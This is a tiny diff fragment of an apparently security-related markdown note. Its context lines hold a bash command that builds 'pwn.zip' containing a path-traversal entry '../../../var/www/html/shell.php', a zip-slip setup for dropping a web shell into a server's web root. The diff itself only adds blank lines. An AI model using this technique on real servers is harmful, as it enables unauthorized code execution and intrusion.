@@ -14,3 +14,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 ```bash
 cd /tmp/1/2/3/4 && zip pwn.zip ../../../var/www/html/shell.php
 ```
+
+
